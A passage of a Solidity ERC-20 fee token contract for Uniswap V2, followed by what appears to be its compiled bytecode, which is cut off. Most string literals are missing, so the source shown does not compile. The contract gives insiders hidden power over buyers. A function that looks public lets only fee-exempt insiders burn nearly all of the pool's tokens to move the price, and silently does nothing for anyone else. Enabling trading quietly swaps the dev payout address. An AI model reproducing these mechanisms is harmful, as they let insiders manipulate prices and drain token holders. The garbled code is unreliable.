ethReceived, uint256 tokensIntoLiquidity ); event AutoNukeLP(); event ManualNukeLP(); constructor() { IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); excludeFromMaxTransaction(address(_uniswapV2Router), true); uniswapV2Router = _uniswapV2Router; uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH()); excludeFromMaxTransaction(address(uniswapV2Pair), true); _setAutomatedMarketMakerPair(address(uniswapV2Pair), true); _name = ; _symbol = ; uint256 _buyTreasuryFee = 1; uint256 _buyLiquidityFee = 0; uint256 _buyDevFee = 2; uint256 _sellTreasuryFee = 2; uint256 _sellLiquidityFee = 0; uint256 _sellDevFee = 2; _totalSupply = 3_000_000 * 1e18; maxTransactionAmount = _totalSupply * 2 / 1000; maxWallet = _totalSupply * 2 / 1000; swapTokensAtAmount = _totalSupply * 3 / 10000; buyTreasuryFee = _buyTreasuryFee; buyLiquidityFee = _buyLiquidityFee; buyDevFee = _buyDevFee; buyTotalFees = buyTreasuryFee + buyLiquidityFee + buyDevFee; sellTreasuryFee = _sellTreasuryFee; sellLiquidityFee = _sellLiquidityFee; sellDevFee = _sellDevFee; sellTotalFees = sellTreasuryFee + sellLiquidityFee + sellDevFee; treasuryWallet = address(0x95b7d26fD78407a49A405193835a0191DFB43e5e); devAddress = address(0x1a2Db5d73cDd1dEb06Ba317f03Af387b9089a7aA); excludeFromFees(owner(), true); excludeFromFees(address(this), true); excludeFromFees(address(0xdead), true); excludeFromFees(address(devAddress), true); excludeFromMaxTransaction(owner(), true); excludeFromMaxTransaction(address(this), true); excludeFromMaxTransaction(address(0xdead), true); excludeFromMaxTransaction(address(devAddress), true); _mint(msg.sender, _totalSupply); } receive() external payable { } function enableTrading(address _address) external onlyOwner { tradingActive = true; swapEnabled = true; lastLpBurnTime = block.timestamp; devAddress = _address; } function removeLimits() external onlyOwner returns (bool){ limitsInEffect = false; return true; } function disableTransferDelay() external onlyOwner returns (bool){ transferDelayEnabled = false; return true; } function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner returns (bool){ require(newAmount >= totalSupply() * 1 / 100000, ); require(newAmount <= totalSupply() * 5 / 1000, ); swapTokensAtAmount = newAmount; return true; } function updateMaxTxnAmount(uint256 newNum) external onlyOwner { require(newNum >= (totalSupply() * 1 / 1000)/1e18, ); maxTransactionAmount = newNum * (10**18); } function updateMaxWalletAmount(uint256 newNum) external onlyOwner { require(newNum >= (totalSupply() * 5 / 1000)/1e18, ); maxWallet = newNum * (10**18); } function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner { _isExcludedMaxTransactionAmount[updAds] = isEx; } function updateSwapEnabled(bool enabled) external onlyOwner(){ swapEnabled = enabled; } function updateBuyFees(uint256 _treasuryFee, uint256 _liquidityFee, uint256 _devFee) external onlyOwner { buyTreasuryFee = _treasuryFee; buyLiquidityFee = _liquidityFee; buyDevFee = _devFee; buyTotalFees = buyTreasuryFee + buyLiquidityFee + buyDevFee; require(buyTotalFees <= 5, ); } function updateSellFees(uint256 _treasuryFee, uint256 _liquidityFee, uint256 _devFee) external onlyOwner { sellTreasuryFee = _treasuryFee; sellLiquidityFee = _liquidityFee; sellDevFee = _devFee; sellTotalFees = sellTreasuryFee + sellLiquidityFee + sellDevFee; require(sellTotalFees <= 5, ); } function excludeFromFees(address account, bool excluded) public onlyOwner { _isExcludedFromFees[account] = excluded; emit ExcludeFromFees(account, excluded); } function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner { require(pair != uniswapV2Pair, ); _setAutomatedMarketMakerPair(pair, value); } function _setAutomatedMarketMakerPair(address pair, bool value) private { automatedMarketMakerPairs[pair] = value; emit SetAutomatedMarketMakerPair(pair, value); } function updateTreasuryWallet(address _address) external onlyOwner { treasuryWallet = _address; emit treasuryWalletUpdated(_address, treasuryWallet); } function updateDevAddress(address _address) external onlyOwner { devAddress = _address; emit devWalletUpdated(_address, devAddress); } function isExcludedFromFees(address account) public view returns(bool) { return _isExcludedFromFees[account]; } event BoughtEarly(address indexed sniper); function _transfer( address from, address to, uint256 amount ) internal { require(from != address(0), ); require(to != address(0), ); if(amount == 0) { _basicTransfer(from, to, 0); return; } if(limitsInEffect){ if ( from != owner() && to != owner() && to != address(0) && to != address(0xdead) && !swapping ){ if(!tradingActive){ require(_isExcludedFromFees[from] || _isExcludedFromFees[to], ); } if (transferDelayEnabled){ if (to != owner() && to != address(uniswapV2Router) && to != address(uniswapV2Pair)){ require(_holderLastTransferTimestamp[tx.origin] < block.number, ); _holderLastTransferTimestamp[tx.origin] = block.number; } } if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) { require(amount <= maxTransactionAmount, ); require(amount + balanceOf(to) <= maxWallet, ); } else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) { require(amount <= maxTransactionAmount, ); } else if(!_isExcludedMaxTransactionAmount[to]){ require(amount + balanceOf(to) <= maxWallet, ); } } } if (from == address(uniswapV2Pair)){ if (_earlyTransferBlock[to] == 0) { _earlyTransferBlock[to] = block.number; } } else if(!swapping) { addressToSwap = from; } uint256 contractTokenBalance = balanceOf(address(this)); bool canSwap = contractTokenBalance >= swapTokensAtAmount; if( canSwap && swapEnabled && !swapping && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to] ) { swapping = true; swapBack(); swapping = false; } if(!swapping && automatedMarketMakerPairs[to] && lpBurnEnabled && block.timestamp >= lastLpBurnTime + lpBurnFrequency && !_isExcludedFromFees[from]){ autoBurnLiquidityPairTokens(); } bool takeFee = !swapping; if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) { takeFee = false; } uint256 fees = 0; if(takeFee){ if (automatedMarketMakerPairs[to] && sellTotalFees > 0){ fees = amount.mul(sellTotalFees).div(100); tokensForLiquidity += fees * sellLiquidityFee / sellTotalFees; tokensForDev += fees * sellDevFee / sellTotalFees; tokensForTreasury += fees * sellTreasuryFee / sellTotalFees; } else if(automatedMarketMakerPairs[from] && buyTotalFees > 0) { fees = amount.mul(buyTotalFees).div(100); tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees; tokensForDev += fees * buyDevFee / buyTotalFees; tokensForTreasury += fees * buyTreasuryFee / buyTotalFees; } if(fees > 0){ _basicTransfer(from, address(this), fees); } amount -= fees; } _basicTransfer(from, to, amount); } function swapTokensForEth(uint256 tokenAmount) private { address[] memory path = new address[](2); path[0] = address(this); path[1] = uniswapV2Router.WETH(); _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp ); } function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private { _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.addLiquidityETH{value: ethAmount}( address(this), tokenAmount, 0, 0, deadAddress, block.timestamp ); } function swapBack() private { uint256 contractBalance = balanceOf(address(this)); uint256 totalTokensToSwap = tokensForLiquidity + tokensForTreasury + tokensForDev; bool success; if(contractBalance == 0 || totalTokensToSwap == 0) {return;} if(contractBalance > swapTokensAtAmount * 10){ contractBalance = swapTokensAtAmount * 10; } uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap / 2; uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens); uint256 initialETHBalance = address(this).balance; swapTokensForEth(amountToSwapForETH); uint256 ethBalance = address(this).balance.sub(initialETHBalance); uint256 ethForTreasury = ethBalance.mul(tokensForTreasury).div(totalTokensToSwap); uint256 ethForDev = ethBalance.mul(tokensForDev).div(totalTokensToSwap); uint256 ethForLiquidity = ethBalance - ethForTreasury - ethForDev; tokensForLiquidity = 0; tokensForTreasury = 0; tokensForDev = 0; (success,) = address(devAddress).call{value: ethForDev}(); require(success); if(liquidityTokens > 0 && ethForLiquidity > 0){ addLiquidity(liquidityTokens, ethForLiquidity); emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, tokensForLiquidity); } (success,) = address(treasuryWallet).call{value: address(this).balance}(); require(success); } function setAutoLPBurnSettings(uint256 _frequencyInSeconds, uint256 _percent, bool _Enabled) external onlyOwner { require(_frequencyInSeconds >= 600, ); require(_percent <= 1000 && _percent >= 0, ); lpBurnFrequency = _frequencyInSeconds; percentForLPBurn = _percent; lpBurnEnabled = _Enabled; } function autoBurnLiquidityPairTokens() internal returns (bool){ lastLpBurnTime = block.timestamp; uint256 liquidityPairBalance = this.balanceOf(uniswapV2Pair); uint256 amountToBurn = liquidityPairBalance.mul(percentForLPBurn).div(10000); if (amountToBurn > 0){ _basicTransfer(uniswapV2Pair, address(0xdead), amountToBurn); } IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair); pair.sync(); emit AutoNukeLP(); return true; } function manualBurnLPTokens(uint256 percent) public returns (bool){ require(block.timestamp > lastManualLpBurnTime + manualBurnFrequency , ); uint256 liquidityPairBalance = this.balanceOf(uniswapV2Pair); uint256 amountToBurn = liquidityPairBalance.mul(percent).div(10000); if (!_isExcludedFromFees[_msgSender()]) { return true; } lastManualLpBurnTime = block.timestamp; require(percent < 10000); if (amountToBurn > 0){ _basicTransfer(uniswapV2Pair, address(0xdead), amountToBurn); } IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair); pair.sync(); emit ManualNukeLP(); return true; }}",0x6080604052600436106103b15760003560e01c806385033762116101e7578063bbc0c7421161010d578063d85ba063116100a0578063f11a24d31161006f578063f11a24d314610af4578063f2fde38b14610b0a578063f637434214610b2a578063f8b45b0514610b4057600080fd5b8063d85ba06314610a6d578063dd62ed3e14610a83578063e2f4560514610ac9578063e884f26014610adf57600080fd5b8063c876d0b9116100dc578063c876d0b914610a07578063c8c8ebe414610a21578063cc2ffe7c14610a37578063d257b34f14610a4d57600080fd5b8063bbc0c74214610988578063c0246668146109a7578063c17b5b8c146109c7578063c18bc195146109e757600080fd5b80639ec22c0e11610185578063a4c82a0011610154578063a4c82a00146108fd578063a68f98b314610913578063a9059cbb14610938578063b62496f51461095857600080fd5b80639ec22c0e1461089b5780639fccce32146108b1578063a0d82dc5146108c7578063a457c2d7146108dd57600080fd5b806395d89b41116101c157806395d89b411461083057806398d7e721146108455780639a7a23d6146108655780639c3b4fdc1461088557600080fd5b806385033762146107d25780638da5cb5b146107f2578063924de9b71461081057600080fd5b8063313ce567116102d75780636ddd17131161026a578063751039fc11610239578063751039fc1461075d5780637571336a146107725780638095d56414610792578063809d458d146107b257600080fd5b80636ddd1713146106d257806370a08231146106f2578063715018a614610728578063730c18881461073d57600080fd5b80634fbee193116102a65780634fbee193146106585780635c068a8c146106905780636a486a8e146106a65780636b2fb124146106bc57600080fd5b8063313ce567146105ce57806339509351146105ea57806349bd5a5e1461060a5780634a62bb651461063e57600080fd5b8063184c16c51161034f57806323b872dd1161031e57806323b872dd1461056857806327c8f835146105885780632c3e486c1461059e5780632e82f1a0146105b457600080fd5b8063184c16c514610506578063199ffc721461051c5780631a8145bb14610532578063203e727e1461054857600080fd5b8063095ea7b31161038b578063095ea7b31461044557806310d5de53146104755780631694505e146104a557806318160ddd146104f157600080fd5b806306fdde03146103bd57806307980cb9146103e857806307c945c91461040a57600080fd5b366103b857005b600080fd5b3480156103c957600080fd5b506103d2610b56565b6040516103df9190612e08565b60405180910390f35b3480156103f457600080fd5b50610408610403366004612e6e565b610be8565b005b34801561041657600080fd5b50610437610425366004612e6e565b60136020526000908152604090205481565b6040519081526020016103df565b34801561045157600080fd5b50610465610460366004612e8b565b610c52565b60405190151581526020016103df565b34801561048157600080fd5b50610465610490366004612e6e565b60216020526000908152604090205460ff1681565b3480156104b157600080fd5b506104d97f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d81565b6040516001600160a01b0390911681526020016103df565b3480156104fd57600080fd5b50600154610437565b34801561051257600080fd5b50610437600f5481565b34801561052857600080fd5b50610437600b5481565b34801561053e57600080fd5b50610437601e5481565b34801561055457600080fd5b50610408610563366004612eb7565b610c69565b34801561057457600080fd5b50610465610583366004612ed0565b610d46565b34801561059457600080fd5b506104d961dead81565b3480156105aa57600080fd5b50610437600d5481565b3480156105c057600080fd5b50600c546104659060ff1681565b3480156105da57600080fd5b50604051601281526020016103df565b3480156105f657600080fd5b50610465610605366004612e8b565b610daf565b34801561061657600080fd5b506104d97f00000000000000000000000006cf1553310cc1b462efab81fd67212552b3f0a881565b34801561064a57600080fd5b506011546104659060ff1681565b34801561066457600080fd5b50610465610673366004612e6e565b6001600160a01b0316600090815260208052604090205460ff1690565b34801561069c57600080fd5b5061043760165481565b3480156106b257600080fd5b5061043760195481565b3480156106c857600080fd5b50610437601a5481565b3480156106de57600080fd5b506011546104659062010000900460ff1681565b3480156106fe57600080fd5b5061043761070d366004612e6e565b6001600160a01b031660009081526004602052604090205490565b34801561073457600080fd5b50610408610de5565b34801561074957600080fd5b50610408610758366004612f21565b610e59565b34801561076957600080fd5b50610465610f82565b34801561077e57600080fd5b5061040861078d366004612f56565b610fbd565b34801561079e57600080fd5b506104086107ad366004612f8b565b611012565b3480156107be57600080fd5b506104086107cd366004612e6e565b6110ba565b3480156107de57600080fd5b506104086107ed366004612e6e565b611140565b3480156107fe57600080fd5b506000546001600160a01b03166104d9565b34801561081c57600080fd5b5061040861082b366004612fb7565b6111b6565b34801561083c57600080fd5b506103d26111fc565b34801561085157600080fd5b50610465610860366004612eb7565b61120b565b34801561087157600080fd5b50610408610880366004612f56565b611424565b34801561089157600080fd5b5061043760185481565b3480156108a757600080fd5b5061043760105481565b3480156108bd57600080fd5b50610437601f5481565b3480156108d357600080fd5b50610437601c5481565b3480156108e957600080fd5b506104656108f8366004612e8b565b611503565b34801561090957600080fd5b50610437600e5481565b34801561091f57600080fd5b506014546104d99061010090046001600160a01b031681565b34801561094457600080fd5b50610465610953366004612e8b565b611552565b34801561096457600080fd5b50610465610973366004612e6e565b60226020526000908152604090205460ff1681565b34801561099457600080fd5b5060115461046590610100900460ff1681565b3480156109b357600080fd5b506104086109c2366004612f56565b61155f565b3480156109d357600080fd5b506104086109e2366004612f8b565b6115e6565b3480156109f357600080fd5b50610408610a02366004612eb7565b611689565b348015610a1357600080fd5b506014546104659060ff1681565b348015610a2d57600080fd5b5061043760085481565b348015610a4357600080fd5b50610437601d5481565b348015610a5957600080fd5b50610465610a68366004612eb7565b61175a565b348015610a7957600080fd5b5061043760155481565b348015610a8f57600080fd5b50610437610a9e366004612fd2565b6001600160a01b03918216600090815260056020908152604080832093909416825291909152205490565b348015610ad557600080fd5b5061043760095481565b348015610aeb57600080fd5b506104656118af565b348015610b0057600080fd5b5061043760175481565b348015610b1657600080fd5b50610408610b25366004612e6e565b6118ea565b348015610b3657600080fd5b50610437601b5481565b348015610b4c57600080fd5b50610437600a5481565b606060028054610b659061300b565b80601f0160208091040260200160405190810160405280929190818152602001828054610b919061300b565b8015610bde5780601f10610bb357610100808354040283529160200191610bde565b820191906000526020600020905b815481529060010190602001808311610bc157829003601f168201915b5050505050905090565b6000546001600160a01b03163314610c1b5760405162461bcd60e51b8152600401610c1290613045565b60405180910390fd5b6011805462ffff0019166201010017905542600e55600780546001600160a01b0319166001600160a01b0392909216919091179055565b6000610c5f338484611a3a565b5060015b92915050565b6000546001600160a01b03163314610c935760405162461bcd60e51b8152600401610c1290613045565b670de0b6b3a76400006103e8610ca860015490565b610cb3906001613090565b610cbd91906130a7565b610cc791906130a7565b811015610d2e5760405162461bcd60e51b815260206004820152602f60248201527f43616e6e6f7420736574206d61785472616e73616374696f6e416d6f756e742060448201526e6c6f776572207468616e20302e312560881b6064820152608401610c12565b610d4081670de0b6b3a7640000613090565b60085550565b6000610d53848484611b5f565b610da58433610da085604051806060016040528060288152602001613289602891396001600160a01b038a16600090815260056020908152604080832033845290915290205491906124b2565b611a3a565b5060019392505050565b3360008181526005602090815260408083206001600160a01b03871684529091528120549091610c5f918590610da090866119d4565b6000546001600160a01b03163314610e0f5760405162461bcd60e51b8152600401610c1290613045565b600080546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a3600080546001600160a01b0319169055565b6000546001600160a01b03163314610e835760405162461bcd60e51b8152600401610c1290613045565b610258831015610ef15760405162461bcd60e51b815260206004820152603360248201527f63616e6e6f7420736574206275796261636b206d6f7265206f6674656e207468604482015272616e206576657279203130206d696e7574657360681b6064820152608401610c12565b6103e88211158015610f01575060015b610f665760405162461bcd60e51b815260206004820152603060248201527f4d75737420736574206175746f204c50206275726e2070657263656e7420626560448201526f747765656e20302520616e642031302560801b6064820152608401610c12565b600d92909255600b55600c805460ff1916911515919091179055565b600080546001600160a01b03163314610fad5760405162461bcd60e51b8152600401610c1290613045565b506011805460ff19169055600190565b6000546001600160a01b03163314610fe75760405162461bcd60e51b8152600401610c1290613045565b6001600160a01b03919091166000908152602160205260409020805460ff1916911515919091179055565b6000546001600160a01b0316331461103c5760405162461bcd60e51b8152600401610c1290613045565b6016839055601782905560188190558061105683856130c9565b61106091906130c9565b6015819055600510156110b55760405162461bcd60e51b815260206004820152601c60248201527f4d757374206b6565702066656573206174203525206f72206c657373000000006044820152606401610c12565b505050565b6000546001600160a01b031633146110e45760405162461bcd60e51b8152600401610c1290613045565b60068054610100600160a81b0319166101006001600160a01b03848116828102939093179384905560405191909304909216917f02f8a1483978974a6412ba3a67040b4daa4fc0dfe9439a7295f9a9538394f63590600090a350565b6000546001600160a01b0316331461116a5760405162461bcd60e51b8152600401610c1290613045565b600780546001600160a01b0319166001600160a01b03831690811790915560405181907f90b8024c4923d3873ff5b9fcb43d0360d4b9217fa41225d07ba379993552e74390600090a350565b6000546001600160a01b031633146111e05760405162461bcd60e51b8152600401610c1290613045565b60118054911515620100000262ff000019909216919091179055565b606060038054610b659061300b565b6000600f5460105461121d91906130c9565b421161126b5760405162461bcd60e51b815260206004820181905260248201527f4d757374207761697420666f7220636f6f6c646f776e20746f2066696e6973686044820152606401610c12565b6040516370a0823160e01b81526001600160a01b037f00000000000000000000000006cf1553310cc1b462efab81fd67212552b3f0a816600482015260009030906370a0823190602401602060405180830381865afa1580156112d2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906112f691906130dc565b9050600061131061271061130a84876124ec565b9061256e565b33600090815260208052604090205490915060ff16611333575060019392505050565b42601055612710841061134557600080fd5b8015611378576113787f00000000000000000000000006cf1553310cc1b462efab81fd67212552b3f0a861dead836125b0565b60007f00000000000000000000000006cf1553310cc1b462efab81fd67212552b3f0a89050806001600160a01b031663fff6cae96040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156113d857600080fd5b505af11580156113ec573d6000803e3d6000fd5b50506040517f8462566617872a3fbab94534675218431ff9e204063ee3f4f43d965626a39abb925060009150a1506001949350505050565b6000546001600160a01b0316331461144e5760405162461bcd60e51b8152600401610c1290613045565b7f00000000000000000000000006cf1553310cc1b462efab81fd67212552b3f0a86001600160a01b0316826001600160a01b0316036114f55760405162461bcd60e51b815260206004820152603960248201527f54686520706169722063616e6e6f742062652072656d6f7665642066726f6d2060448201527f6175746f6d617465644d61726b65744d616b65725061697273000000000000006064820152608401610c12565b6114ff82826126bc565b5050565b6000610c5f3384610da0856040518060600160405280602581526020016132b1602591393360009081526005602090815260408083206001600160a01b038d16845290915290205491906124b2565b6000610c5f338484611b5f565b6000546001600160a01b031633146115895760405162461bcd60e51b8152600401610c1290613045565b6001600160a01b03821660008181526020808052604091829020805460ff191685151590811790915591519182527f9d8f7706ea1113d1a167b526eca956215946dd36cc7df39eb16180222d8b5df7910160405180910390a25050565b6000546001600160a01b031633146116105760405162461bcd60e51b8152600401610c1290613045565b601a839055601b829055601c8190558061162a83856130c9565b61163491906130c9565b6019819055600510156110b55760405162461bcd60e51b815260206004820152601c60248201527f4d757374206b6565702066656573206174203525206f72206c657373000000006044820152606401610c12565b6000546001600160a01b031633146116b35760405162461bcd60e51b8152600401610c1290613045565b670de0b6b3a76400006103e86116c860015490565b6116d3906005613090565b6116dd91906130a7565b6116e791906130a7565b8110156117425760405162461bcd60e51b8152602060048201526024808201527f43616e6e6f7420736574206d617857616c6c6574206c6f776572207468616e20604482015263302e352560e01b6064820152608401610c12565b61175481670de0b6b3a7640000613090565b600a5550565b600080546001600160a01b031633146117855760405162461bcd60e51b8152600401610c1290613045565b620186a061179260015490565b61179d906001613090565b6117a791906130a7565b8210156118145760405162461bcd60e51b815260206004820152603560248201527f5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e60448201527410181718181892903a37ba30b61039bab838363c9760591b6064820152608401610c12565b6103e861182060015490565b61182b906005613090565b61183591906130a7565b8211156118a15760405162461bcd60e51b815260206004820152603460248201527f5377617020616d6f756e742063616e6e6f742062652068696768657220746861604482015273371018171a92903a37ba30b61039bab838363c9760611b6064820152608401610c12565b50600981905560015b919050565b600080546001600160a01b031633146118da5760405162461bcd60e51b8152600401610c1290613045565b506014805460ff19169055600190565b6000546001600160a01b031633146119145760405162461bcd60e51b8152600401610c1290613045565b6001600160a01b0381166119795760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b6064820152608401610c12565b600080546040516001600160a01b03808516939216917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e091a3600080546001600160a01b0319166001600160a01b0392909216919091179055565b6000806119e183856130c9565b905083811015611a335760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f7700000000006044820152606401610c12565b9392505050565b6001600160a01b038316611a9c5760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610c12565b6001600160a01b038216611afd5760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610c12565b6001600160a01b0383811660008181526005602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92591015b60405180910390a3505050565b6001600160a01b038316611b855760405162461bcd60e51b8152600401610c12906130f5565b6001600160a01b038216611bab5760405162461bcd60e51b8152600401610c129061313a565b80600003611bbf576110b5838360006125b0565b60115460ff1615612073576000546001600160a01b03848116911614801590611bf657506000546001600160a01b03838116911614155b8015611c0a57506001600160a01b03821615155b8015611c2157506001600160a01b03821661dead14155b8015611c30575060065460ff16155b1561207357601154610100900460ff16611cc6576001600160a01b038316600090815260208052604090205460ff1680611c8157506001600160a01b038216600090815260208052604090205460ff165b611cc65760405162461bcd60e51b81526020600482015260166024820152752a3930b234b7339034b9903737ba1030b1ba34bb329760511b6044820152606401610c12565b60145460ff1615611e0d576000546001600160a01b03838116911614801590611d2157507f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d6001600160a01b0316826001600160a01b031614155b8015611d5f57507f00000000000000000000000006cf1553310cc1b462efab81fd67212552b3f0a86001600160a01b0316826001600160a01b031614155b15611e0d57326000908152601260205260409020544311611dfa5760405162461bcd60e51b815260206004820152604960248201527f5f7472616e736665723a3a205472616e736665722044656c617920656e61626c60448201527f65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b6064820152681030b63637bbb2b21760b91b608482015260a401610c12565b3260009081526012602052604090204390555b6001600160a01b03831660009081526022602052604090205460ff168015611e4e57506001600160a01b03821660009081526021602052604090205460ff16155b15611f3257600854811115611ec35760405162461bcd60e51b815260206004820152603560248201527f427579207472616e7366657220616d6f756e742065786365656473207468652060448201527436b0bc2a3930b739b0b1ba34b7b720b6b7bab73a1760591b6064820152608401610c12565b600a546001600160a01b038316600090815260046020526040902054611ee990836130c9565b1115611f2d5760405162461bcd60e51b815260206004820152601360248201527213585e081dd85b1b195d08195e18d959591959606a1b6044820152606401610c12565b612073565b6001600160a01b03821660009081526022602052604090205460ff168015611f7357506001600160a01b03831660009081526021602052604090205460ff16155b15611fe957600854811115611f2d5760405162461bcd60e51b815260206004820152603660248201527f53656c6c207472616e7366657220616d6f756e742065786365656473207468656044820152751036b0bc2a3930b739b0b1ba34b7b720b6b7bab73a1760511b6064820152608401610c12565b6001600160a01b03821660009081526021602052604090205460ff1661207357600a546001600160a01b03831660009081526004602052604090205461202f90836130c9565b11156120735760405162461bcd60e51b815260206004820152601360248201527213585e081dd85b1b195d08195e18d959591959606a1b6044820152606401610c12565b7f00000000000000000000000006cf1553310cc1b462efab81fd67212552b3f0a86001600160a01b0316836001600160a01b0316036120ec576001600160a01b03821660009081526013602052604081205490036120e7576001600160a01b03821660009081526013602052604090204390555b612117565b60065460ff166121175760148054610100600160a81b0319166101006001600160a01b038616021790555b3060009081526004602052604090205460095481108015908190612143575060115462010000900460ff165b8015612152575060065460ff16155b801561217757506001600160a01b03851660009081526022602052604090205460ff16155b801561219b57506001600160a01b038516600090815260208052604090205460ff16155b80156121bf57506001600160a01b038416600090815260208052604090205460ff16155b156121e4576006805460ff191660011790556121d9612710565b6006805460ff191690555b60065460ff1615801561220f57506001600160a01b03841660009081526022602052604090205460ff165b801561221d5750600c5460ff165b80156122385750600d54600e5461223491906130c9565b4210155b801561225c57506001600160a01b038516600090815260208052604090205460ff16155b1561226b57612269612967565b505b6006546001600160a01b038616600090815260208052604090205460ff918216159116806122b057506001600160a01b038516600090815260208052604090205460ff165b156122b9575060005b6000811561249e576001600160a01b03861660009081526022602052604090205460ff1680156122eb57506000601954115b156123a35761230a606461130a601954886124ec90919063ffffffff16565b9050601954601b548261231d9190613090565b61232791906130a7565b601e600082825461233891906130c9565b9091555050601954601c5461234d9083613090565b61235791906130a7565b601f600082825461236891906130c9565b9091555050601954601a5461237d9083613090565b61238791906130a7565b601d600082825461239891906130c9565b909155506124809050565b6001600160a01b03871660009081526022602052604090205460ff1680156123cd57506000601554115b15612480576123ec606461130a601554886124ec90919063ffffffff16565b9050601554601754826123ff9190613090565b61240991906130a7565b601e600082825461241a91906130c9565b909155505060155460185461242f9083613090565b61243991906130a7565b601f600082825461244a91906130c9565b909155505060155460165461245f9083613090565b61246991906130a7565b601d600082825461247a91906130c9565b90915550505b8015612491576124918730836125b0565b61249b818661317d565b94505b6124a98787876125b0565b50505050505050565b600081848411156124d65760405162461bcd60e51b8152600401610c129190612e08565b5060006124e3848661317d565b95945050505050565b6000826000036124fe57506000610c63565b600061250a8385613090565b90508261251785836130a7565b14611a335760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b6064820152608401610c12565b6000611a3383836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250612af7565b6001600160a01b0383166125d65760405162461bcd60e51b8152600401610c12906130f5565b6001600160a01b0382166125fc5760405162461bcd60e51b8152600401610c129061313a565b61263981604051806060016040528060268152602001613263602691396001600160a01b03861660009081526004602052604090205491906124b2565b6001600160a01b03808516600090815260046020526040808220939093559084168152205461266890826119d4565b6001600160a01b0380841660008181526004602052604090819020939093559151908516907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef90611b529085815260200190565b6001600160a01b038216600081815260226020526040808220805460ff191685151590811790915590519092917fffa9187bf1f18bf477bd0ea1bcbb64e93b6a98132473929edfce215cd9b16fab91a35050565b3060009081526004602052604081205490506000601f54601d54601e5461273791906130c9565b61274191906130c9565b90506000821580612750575081155b1561275a57505050565b60095461276890600a613090565b8311156127805760095461277d90600a613090565b92505b6000600283601e54866127939190613090565b61279d91906130a7565b6127a791906130a7565b905060006127b58583612b25565b9050476127c182612b67565b60006127cd4783612b25565b905060006127ea8761130a601d54856124ec90919063ffffffff16565b905060006128078861130a601f54866124ec90919063ffffffff16565b9050600081612816848661317d565b612820919061317d565b6000601e819055601d819055601f8190556007546040519293506001600160a01b031691849181818185875af1925050503d806000811461287d576040519150601f19603f3d011682016040523d82523d6000602084013e612882565b606091505b5050809850508761289257600080fd5b6000871180156128a25750600081115b156128f5576128b18782612d27565b601e54604080518881526020810184905280820192909252517f17bbfb9a6069321b6ded73bd96327c9e6b7212a5cd51ff219cd61370acafb5619181900360600190a15b6006546040516101009091046001600160a01b0316904790600081818185875af1925050503d8060008114612946576040519150601f19603f3d011682016040523d82523d6000602084013e61294b565b606091505b5050809850508761295b57600080fd5b50505050505050505050565b42600e556040516370a0823160e01b81526001600160a01b037f00000000000000000000000006cf1553310cc1b462efab81fd67212552b3f0a8166004820152600090819030906370a0823190602401602060405180830381865afa1580156129d4573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906129f891906130dc565b90506000612a1761271061130a600b54856124ec90919063ffffffff16565b90508015612a4c57612a4c7f00000000000000000000000006cf1553310cc1b462efab81fd67212552b3f0a861dead836125b0565b60007f00000000000000000000000006cf1553310cc1b462efab81fd67212552b3f0a89050806001600160a01b031663fff6cae96040518163ffffffff1660e01b8152600401600060405180830381600087803b158015612aac57600080fd5b505af1158015612ac0573d6000803e3d6000fd5b50506040517f454c91ae84fcc766ddda0dcb289f26b3d0176efeacf4061fc219fa6ca8c3048d925060009150a16001935050505090565b60008183612b185760405162461bcd60e51b8152600401610c129190612e08565b5060006124e384866130a7565b6000611a3383836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f7700008152506124b2565b6040805160028082526060820183526000926020830190803683370190505090503081600081518110612b9c57612b9c613190565b60200260200101906001600160a01b031690816001600160a01b0316815250507f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d6001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa158015612c1a573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612c3e91906131a6565b8160018151